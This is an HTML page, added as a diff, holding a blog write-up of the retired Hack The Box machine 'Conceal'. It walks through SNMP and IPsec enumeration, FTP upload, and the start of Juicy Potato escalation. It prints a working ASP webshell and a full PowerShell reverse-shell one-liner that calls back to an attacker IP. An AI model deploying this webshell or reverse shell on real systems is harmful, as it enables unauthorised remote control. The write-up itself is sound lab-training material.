@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Conceal | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Conceal" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency)." />
+<meta property="og:description" content="Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency)." />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/conceal/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/conceal/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/conceal/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-05-18T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Conceal","dateModified":"2019-05-18T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/conceal/","datePublished":"2019-05-18T00:00:00+02:00","image":"http://localhost:4000/hackthebox/conceal/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/conceal/"},"description":"Quick Summary Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining IPSEC connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is 10.10.10.116, I added it to /etc/hosts as conceal.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services. nmap -sV -sT -sC conceal.htb And we got nothing ! I ran another nmap UDP scan on all ports : nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0 The output was too long so I will show the only important part : It was not sure about port 161, but it showed that port 500 is open. I ran a third scan on ports 500 and 161 : nmap -p 161,500 -sV -sU -sC conceal.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb Nmap scan report for conceal.htb (10.10.10.116) Host is up (0.20s latency).","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Conceal</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-05-18T00:00:00+02:00" itemprop="datePublished">May 18, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-conceal-retired-and-heres-my-write-up-about-it-conceal-was-a-straightforward-fun-box-the-only-tricky-part-about-it-is-gaining-ipsec-connection-to-gain-access-to-some-filtered-services-that-first-part-involved-some-guessing-but-after-that-everything-is-simple-and-very-straightforward-i-liked-this-machine-and-it-was-a-very-fun-one-its-a-windows-machine-and-its-ip-is-101010116-i-added-it-to-etchosts-as-concealhtb-lets-jump-right-in">Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining <a href="https://en.wikipedia.org/wiki/IPsec">IPSEC</a> connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is <code class="highlighter-rouge">10.10.10.116</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">conceal.htb</code>. Let’s jump right in.</h4>
+<p><img src="/images/hackthebox/conceal/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services.</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
+<img src="/images/hackthebox/conceal/1.png" alt="" /></p>
+<h4 id="and-we-got-nothing-">And we got nothing !</h4>
+<h4 id="i-ran-another-nmap-udp-scan-on-all-ports-">I ran another <code class="highlighter-rouge">nmap</code> UDP scan on all ports :</h4>
+<p><code class="highlighter-rouge">nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0</code></p>
+<h4 id="the-output-was-too-long-so-i-will-show-the-only-important-part-">The output was too long so I will show the only important part :</h4>
+<p><img src="/images/hackthebox/conceal/2.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/conceal/3.png" alt="" /></p>
+<h4 id="it-was-not-sure-about-port-161-but-it-showed-that-port-500-is-open">It was not sure about port 161, but it showed that port 500 is open.</h4>
+<h4 id="i-ran-a-third-scan-on-ports-500-and-161-">I ran a third scan on ports 500 and 161 :</h4>
+<p><code class="highlighter-rouge">nmap -p 161,500 -sV -sU -sC conceal.htb</code>
+<img src="/images/hackthebox/conceal/4.png" alt="" /></p>
+<h4 id="full-output-">Full Output :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
+Nmap scan report for conceal.htb (10.10.10.116)
+Host is up (0.20s latency).
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server (public)
+| snmp-interfaces: 
+|   Software Loopback Interface 1\x00
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 1 Gbps
+|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
+|   Intel(R) 82574L Gigabit Network Connection\x00
+|     IP address: 10.10.10.116  Netmask: 255.255.255.0
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
+|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
+|     MAC address: 00:50:56:b9:55:a7 (VMware)
+|     Type: ethernetCsmacd  Speed: 1 Gbps
+|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
+| snmp-netstat: 
+|   TCP  0.0.0.0:21           0.0.0.0:0
+|   TCP  0.0.0.0:80           0.0.0.0:0
+|   TCP  0.0.0.0:135          0.0.0.0:0
+|   TCP  0.0.0.0:445          0.0.0.0:0
+|   TCP  0.0.0.0:49664        0.0.0.0:0
+|   TCP  0.0.0.0:49665        0.0.0.0:0
+|   TCP  0.0.0.0:49666        0.0.0.0:0
+|   TCP  0.0.0.0:49667        0.0.0.0:0
+|   TCP  0.0.0.0:49668        0.0.0.0:0
+|   TCP  0.0.0.0:49669        0.0.0.0:0
+|   TCP  0.0.0.0:49670        0.0.0.0:0
+|   TCP  10.10.10.116:139     0.0.0.0:0
+|   UDP  0.0.0.0:123          *:*
+|   UDP  0.0.0.0:161          *:*
+|   UDP  0.0.0.0:500          *:*
+|   UDP  0.0.0.0:4500         *:*
+|   UDP  0.0.0.0:5050         *:*
+|   UDP  0.0.0.0:5353         *:*
+|   UDP  0.0.0.0:5355         *:*
+|   UDP  10.10.10.116:137     *:*
+|   UDP  10.10.10.116:138     *:*
+|   UDP  10.10.10.116:1900    *:*
+|   UDP  10.10.10.116:65496   *:*
+|   UDP  127.0.0.1:1900       *:*
+|_  UDP  127.0.0.1:65497      *:*
+| snmp-processes: 
+|   1: 
+|     Name: System Idle Process
+|   4: 
+|     Name: System
+|   308: 
+|     Name: smss.exe
+|   348: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalSystemNetworkRestricted
+|   392: 
+|     Name: csrss.exe
+|   468: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalService
+|   472: 
+|     Name: wininit.exe
+|   484: 
+|     Name: csrss.exe
+|   564: 
+|     Name: winlogon.exe
+|   584: 
+|     Name: services.exe
+|   616: 
+|     Name: lsass.exe
+|     Path: C:\Windows\system32\
+|   696: 
+|     Name: fontdrvhost.exe
+|   704: 
+|     Name: fontdrvhost.exe
+|   712: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k DcomLaunch
+|   812: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k RPCSS
+|   900: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k NetworkService
+|   908: 
+|     Name: dwm.exe
+|   940: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k netsvcs
+|   976: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   984: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceNoNetwork
+|   1140: 
+|     Name: vmacthlp.exe
+|     Path: C:\Program Files\VMware\VMware Tools\
+|   1232: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1248: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalSystemNetworkRestricted
+|   1292: 
+|     Name: LogonUI.exe
+|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
+|   1392: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1400: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k LocalServiceNetworkRestricted
+|   1492: 
+|     Name: spoolsv.exe
+|     Path: C:\Windows\System32\
+|   1728: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k apphost
+|   1748: 
+|     Name: svchost.exe
+|     Path: C:\Windows\System32\
+|     Params: -k utcsvc
+|   1788: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k ftpsvc
+|   1856: 
+|     Name: SecurityHealthService.exe
+|   1868: 
+|     Name: snmp.exe
+|     Path: C:\Windows\System32\
+|   1892: 
+|     Name: VGAuthService.exe
+|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
+|   1912: 
+|     Name: vmtoolsd.exe
+|     Path: C:\Program Files\VMware\VMware Tools\
+|   1932: 
+|     Name: ManagementAgentHost.exe
+|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
+|   1956: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k iissvcs
+|   1980: 
+|     Name: MsMpEng.exe
+|   2068: 
+|     Name: Memory Compression
+|   2204: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k LocalServiceAndNoImpersonation
+|   2444: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k NetworkServiceNetworkRestricted
+|   2952: 
+|     Name: WmiPrvSE.exe
+|     Path: C:\Windows\system32\wbem\
+|   2976: 
+|     Name: NisSrv.exe
+|   3052: 
+|     Name: dllhost.exe
+|     Path: C:\Windows\system32\
+|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+|   3132: 
+|     Name: SearchIndexer.exe
+|     Path: C:\Windows\system32\
+|     Params: /Embedding
+|   3280: 
+|     Name: svchost.exe
+|     Path: C:\Windows\system32\
+|     Params: -k appmodel
+|   3376: 
+|     Name: msdtc.exe
+|     Path: C:\Windows\System32\
+|   3948: 
+|     Name: svchost.exe
+|   5004: 
+|     Name: SearchFilterHost.exe
+|     Path: C:\Windows\system32\
+|     Params:  0 700 704 712 8192 708 
+|   5032: 
+|     Name: SearchProtocolHost.exe
+|     Path: C:\Windows\system32\
+|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 "Software\Microsoft\Windows Search" "Moz
+| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
+|_  System uptime: 2h08m26.61s (770661 timeticks)
+| snmp-win32-services: 
+|   Application Host Helper Service
+|   Background Intelligent Transfer Service
+|   Background Tasks Infrastructure Service
+|   Base Filtering Engine
+|   CNG Key Isolation
+|   COM+ Event System
+|   COM+ System Application
+|   Client License Service (ClipSVC)
+|   Connected Devices Platform Service
+|   Connected User Experiences and Telemetry
+|   CoreMessaging
+|   Cryptographic Services
+|   DCOM Server Process Launcher
+|   DHCP Client
+|   DNS Client
+|   Data Sharing Service
+|   Data Usage
+|   Device Setup Manager
+|   Diagnostic Policy Service
+|   Diagnostic Service Host
+|   Distributed Link Tracking Client
+|   Distributed Transaction Coordinator
+|   Geolocation Service
+|   Group Policy Client
+|   IKE and AuthIP IPsec Keying Modules
+|   IP Helper
+|   IPsec Policy Agent
+|   Local Session Manager
+|   Microsoft Account Sign-in Assistant
+|   Microsoft FTP Service
+|   Network Connection Broker
+|   Network List Service
+|   Network Location Awareness
+|   Network Store Interface Service
+|   Plug and Play
+|   Power
+|   Print Spooler
+|   Program Compatibility Assistant Service
+|   RPC Endpoint Mapper
+|   Remote Procedure Call (RPC)
+|   SNMP Service
+|   SSDP Discovery
+|   Security Accounts Manager
+|   Security Center
+|   Server
+|   Shell Hardware Detection
+|   State Repository Service
+|   Storage Service
+|   Superfetch
+|   System Event Notification Service
+|   System Events Broker
+|   TCP/IP NetBIOS Helper
+|   Task Scheduler
+|   Themes
+|   Tile Data model server
+|   Time Broker
+|   TokenBroker
+|   User Manager
+|   User Profile Service
+|   VMware Alias Manager and Ticket Service
+|   VMware CAF Management Agent Service
+|   VMware Physical Disk Helper Service
+|   VMware Tools
+|   WinHTTP Web Proxy Auto-Discovery Service
+|   Windows Audio
+|   Windows Audio Endpoint Builder
+|   Windows Connection Manager
+|   Windows Defender Antivirus Network Inspection Service
+|   Windows Defender Antivirus Service
+|   Windows Defender Security Centre Service
+|   Windows Driver Foundation - User-mode Driver Framework
+|   Windows Event Log
+|   Windows Firewall
+|   Windows Font Cache Service
+|   Windows Management Instrumentation
+|   Windows Process Activation Service
+|   Windows Push Notifications System Service
+|   Windows Search
+|   Windows Time
+|   Workstation
+|_  World Wide Web Publishing Service
+| snmp-win32-software: 
+|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
+|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
+|_  VMware Tools; 2018-10-12T20:11:02
+| snmp-win32-users: 
+|   Administrator
+|   DefaultAccount
+|   Destitute
+|_  Guest
+500/udp open  isakmp  Microsoft Windows 8
+| ike-version: 
+|   vendor_id: Microsoft Windows 8
+|   attributes: 
+|     MS NT5 ISAKMPOAKLEY
+|     RFC 3947 NAT-T
+|     draft-ietf-ipsec-nat-t-ike-02\n
+|     IKE FRAGMENTATION
+|     MS-Negotiation Discovery Capable
+|_    IKE CGA version 1
+Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
+</code></pre></div></div>
+<h4 id="we-have-two-services-to-enumerate-isakmp-which-is-ipsec-and-snmp">We have two services to enumerate. <code class="highlighter-rouge">isakmp</code> which is <code class="highlighter-rouge">IPSEC</code> and <code class="highlighter-rouge">snmp</code>.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="snmp-enumeration">Snmp Enumeration</h3>
+<h4 id="i-started-with-snmpwalk-">I started with <code class="highlighter-rouge">snmpwalk</code> :</h4>
+<p><code class="highlighter-rouge">snmpwalk -c public -v 1 conceal.htb</code></p>
+<h4 id="the-output-was-very-long-but-we-only-need-this-first-part-">The output was very long but we only need this first part :</h4>
+<p><img src="/images/hackthebox/conceal/5.png" alt="" /></p>
+<h4 id="we-have-a-password-hash-for-the-ipsec-connection--9c8b1a372b1878851be2c097031b6e43">We have a password hash for the <code class="highlighter-rouge">IPSEC</code> connection : <code class="highlighter-rouge">9C8B1A372B1878851BE2C097031B6E43</code></h4>
+<h4 id="i-used-crackstation-to-crack-it-and-i-got-this-result-">I used <a href="https://crackstation.net/">crackstation</a> to crack it and I got this result :</h4>
+<p><img src="/images/hackthebox/conceal/6.png" alt="" /></p>
+<h4 id="great--now-we-need-to-enumerate-the-ike-vpn-service-to-know-how-to-connect-to-it">Great ! Now we need to enumerate the <code class="highlighter-rouge">ike</code> vpn service to know how to connect to it.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="ike-scan-setting-up-the-connection"><code class="highlighter-rouge">ike-scan</code>, Setting up The Connection</h3>
+<h4 id="i-ran-ike-scan-and-got-these-results-">I ran <code class="highlighter-rouge">ike-scan</code> and got these results :</h4>
+<p><img src="/images/hackthebox/conceal/7.png" alt="" /></p>
+<h4 id="i-installed-strongswan-to-set-up-the-ipsec-connection-with-the-help-of-the-info-i-got-from-ike-scan-and-some-guessing-i-could-come-up-with-this-configuration-which-worked-">I installed <code class="highlighter-rouge">strongswan</code> to set up the <code class="highlighter-rouge">IPSEC</code> connection. With the help of the info I got from <code class="highlighter-rouge">ike-scan</code> and some guessing I could come up with this configuration which worked :</h4>
+<p><br />
+<code class="highlighter-rouge">/etc/ipsec.conf</code> :
+<img src="/images/hackthebox/conceal/8.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>conn rick-to-conceal
+        authby=secret
+        auto=route
+        keyexchange=ikev1
+        ike=3des-sha1-modp1024
+        left=10.10.xx.xx
+        right=10.10.10.116
+        type=transport
+        esp=3des-sha1
+        rightprotoport=tcp
+</code></pre></div></div>
+<p><br />
+<br />
+<code class="highlighter-rouge">/etc/ipsec.secrets</code> :
+<img src="/images/hackthebox/conceal/9.png" alt="" /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx 10.10.10.116 : PSK "Dudecake1!"
+</code></pre></div></div>
+<h4 id="i-started-ipsec-then-i-initialized-the-connection-">I started <code class="highlighter-rouge">ipsec</code> then I initialized the connection :</h4>
+<p><code class="highlighter-rouge">ipsec start</code>
+<br />
+<br />
+<code class="highlighter-rouge">ipsec up rick-to-conceal</code>
+<img src="/images/hackthebox/conceal/10.png" alt="" /></p>
+<h4 id="it-worked-fine-now-we-are-connected-to-a-vpn-network-lets-see-what-new-services-can-we-get">It worked fine, now we are connected to a vpn network let’s see what new services can we get.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="nmap-second-time">Nmap (Second Time)</h3>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC conceal.htb</code>
+<img src="/images/hackthebox/conceal/11.png" alt="" /></p>
+<h4 id="we-got-ftp-on-port-21--http-on-port-80-and-smb-on-port-445-i-wanted-to-check-ftp-first-and-see-if-i-can-authenticate-anonymously">We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.</h4>
+<hr />
+
+<h3 id="ftp-file-upload-reverse-shell-and-user-flag">FTP, File Upload, Reverse Shell and User Flag</h3>
+<p><img src="/images/hackthebox/conceal/12.png" alt="" /></p>
+<h4 id="it-worked-but-there-was-literally-nothing-on-that-ftp-server-i-uploaded-a-test-file-to-check-if-i-have-write-permissions-on-that-ftp-server-and-i-had">It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.</h4>
+<p><img src="/images/hackthebox/conceal/13.png" alt="" /></p>
+<h4 id="i-checked-the-http-service-and-there-was-only-the-default-iis-page-">I Checked the http service and there was only the default IIS page :</h4>
+<p><img src="/images/hackthebox/conceal/14.png" alt="" /></p>
+<h4 id="i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-only-one-directory-called-uplaod-">I ran <code class="highlighter-rouge">gobuster</code> with <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and got only one directory called <code class="highlighter-rouge">/uplaod</code> :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt
+
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://conceal.htb/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/05/17 17:18:57 Starting gobuster
+=====================================================
+/upload (Status: 301)
+=====================================================
+2019/05/17 17:28:23 Finished
+=====================================================
+</code></pre></div></div>
+<h4 id="i-went-to-upload-and-found-my-test-file-">I went to <code class="highlighter-rouge">/upload</code> and found my test file :</h4>
+<p><img src="/images/hackthebox/conceal/15.png" alt="" /></p>
+<h4 id="great--i-uploaded-an-asp-shell-to-get-remote-code-execution-">Great ! I uploaded an <code class="highlighter-rouge">asp</code> shell to get remote code execution :</h4>
+<p><img src="/images/hackthebox/conceal/16.png" alt="" /></p>
+<h4 id="shellasp-"><code class="highlighter-rouge">shell.asp</code> :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--
+ASP Webshell
+Working on latest IIS 
+Referance :- 
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
+http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
+http://www.w3schools.com/asp/
+--&gt;
+
+
+&lt;%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%&gt;
+
+
+&lt;HTML&gt;
+&lt;BODY&gt;
+&lt;FORM action="" method="GET"&gt;
+&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
+&lt;input type="submit" value="Run"&gt;
+&lt;/FORM&gt;
+&lt;PRE&gt;
+&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
+&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
+&lt;p&gt;
+&lt;b&gt;The server's port:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
+&lt;/p&gt;
+&lt;p&gt;
+&lt;b&gt;The server's software:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
+&lt;/p&gt;
+&lt;p&gt;
+&lt;b&gt;The server's software:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
+&lt;% szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" &amp; szCMD)
+Response.Write(thisDir)%&gt;
+&lt;/p&gt;
+&lt;br&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</code></pre></div></div>
+<p><img src="/images/hackthebox/conceal/17.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/conceal/18.png" alt="" /></p>
+<h4 id="i-got-a-powershell-reverse-shell-">I got a powershell reverse shell :</h4>
+<p><img src="/images/hackthebox/conceal/19.png" alt="" /></p>
+<h4 id="payload-">Payload :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.xx.xx',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+</code></pre></div></div>
+<p><img src="/images/hackthebox/conceal/20.png" alt="" /></p>
+<h4 id="we-got-user">We got user.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="seimpersonateprivilege-juicy-potato-privilege-escalation-and-root-flag">SeImpersonatePrivilege, Juicy Potato, Privilege Escalation and Root Flag</h3>
+<h4 id="after-getting-user-the-privilege-escalation-is-easy-and-straightforward-before-doing-any-enumeration-i-checked-my-privileges-as-destitute-and-i-found-that-i-had-the-seimpersonateprivilege">After getting user the privilege escalation is easy and straightforward. Before doing any enumeration I checked my privileges as <code class="highlighter-rouge">Destitute</code> and I found that I had the <code class="highlighter-rouge">SeImpersonatePrivilege</code>.</h4>
+<p><img src="/images/hackthebox/conceal/21.png" alt="" /></p>
+<h4 id="this-means-that-we-can-apply-the-famous-attack-juicy-potato-you-can-read-about-it-on-the-official-github-repository-we-need-to-know-the-version-of-this-windows-to-pick-the-right-clsid">This means that we can apply the famous attack <code class="highlighter-rouge">Juicy Potato</code>. You can read about it on the <a href="https://github.com/ohpe/juicy-potato">official github repository</a>. We need to know the version of this windows to pick the right <code class="highlighter-rouge">clsid</code>.</h4>
+<p><code class="highlighter-rouge">systeminfo</code>
+<img src="/images/hackthebox/conceal/22.png" alt="" /></p>
